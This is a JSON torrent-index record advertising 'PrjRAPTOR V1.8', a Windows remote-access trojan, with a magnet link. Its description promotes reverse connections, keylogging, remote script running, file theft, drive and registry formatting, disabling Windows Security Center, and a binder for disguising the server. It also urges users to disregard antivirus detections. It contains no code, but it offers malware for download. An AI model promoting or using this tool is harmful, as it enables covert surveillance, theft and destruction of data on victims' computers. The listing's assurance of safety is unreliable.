{"title":"PrjRAPTOR V1.8","uid":5057228,"size":7008670,"categoryP":"applications","categoryS":"windows","magnet":"?xt=urn:btih:dee6d3cc8af6243e1d9db0691b22a63dbae7372f&amp;dn=PrjRAPTOR+V1.8&amp;tr=udp%3A%2F%2Ftracker.openbittorrent.com%3A80&amp;tr=udp%3A%2F%2Fopen.demonii.com%3A1337&amp;tr=udp%3A%2F%2Ftracker.coppersurfer.tk%3A6969&amp;tr=udp%3A%2F%2Fexodus.desync.com%3A6969","seeders":0,"leechers":1,"uploader":"suprhexcrack","files":1,"time":1250491559,"description":"PrjRAPTOR V1.8\n\n\nI'm seeding for a while. (Second time upload cause sist time the tracker didnt work, hopefully it works now.)\n\nIf you like this program please seed.\n\n\n\n\nInformation:\n\n\n\nCURRENT FEATURES:  Reverse Connection, Polocy Control (Block Programs, Explorer and Internet Explorer Policy Settings, Control Panel), Power Options (I.E. - Shutdown), Manage Windows, Manage Processes, Manage Files (w/ functional upload/download), Keyboard Emulation, Fun ;), Hard Drive/Registry Formatting, Messageing, Remote Script Running, Clipboard Control, Keylogging, Record Saving, Binder, Icon Support.\n\n\nThings You ShouldKnow\n\nBefore you start using PrjRAPTOR there are a few basic things that you should know. First of all i urge you to look carefully at the &quot;Server Builder&quot;'s functions. Note that if you check the&quot;Kill Windows Security Center&quot; box and then test the server on yourself, it will kill your security center. Also, if you are new to these types of programs is strongly suggest you read most of this help file, it should get you p to speed.\n\n    * First off, your anti-virus may pick up PrjRAPTOR as a virus. This is because it associates virus-makers with the virus itself. As long as you download this virus from a torrent that I have provided you are safe.\n    * PrjRAPTOR is coded in VB so in order for the Client(your application) to connect to a target you must have the VB6 Runtime installed. You should be automatically prompted the first time you use PrjRAPTORto install the runtime. After the installation is complete restart your computerand then open PrjRAPTOR again. This time it should load up. READ THE NOTE TITLED&quot;ATTENTION&quot;. If you need to re-install the Runtime you can download it here.\n    * You can change the Skin, cursor and many default options on the options form. To get to the options form press the left-most button (next to the help button) on the title bar.\n    * Always check the label at the bottom of the main form for status updates. Even when you are performing actions on other forms the update information is changed on the main form.\n    * I do not intend to be condescending in this help file, but it may appear that way because i try to go as simple as possible. Somethings in this help file are absolute beginner concepts, but i have to make sure that everyone understands, so try not to let it bother you.\n\n\n\n\n\n\n\nAll creds goes to PrjRAPTOR\t","torrent":{"xt":"urn:btih:dee6d3cc8af6243e1d9db0691b22a63dbae7372f","amp;dn":"PrjRAPTOR+V1.8","amp;tr":["udp%3A%2F%2Ftracker.openbittorrent.com%3A80","udp%3A%2F%2Fopen.demonii.com%3A1337","udp%3A%2F%2Ftracker.coppersurfer.tk%3A6969","udp%3A%2F%2Fexodus.desync.com%3A6969"],"infoHash":"dee6d3cc8af6243e1d9db0691b22a63dbae7372f","infoHashBuffer":{"type":"Buffer","data":[222,230,211,204,138,246,36,62,29,157,176,105,27,34,166,61,186,231,55,47]},"announce":[],"urlList":[]}}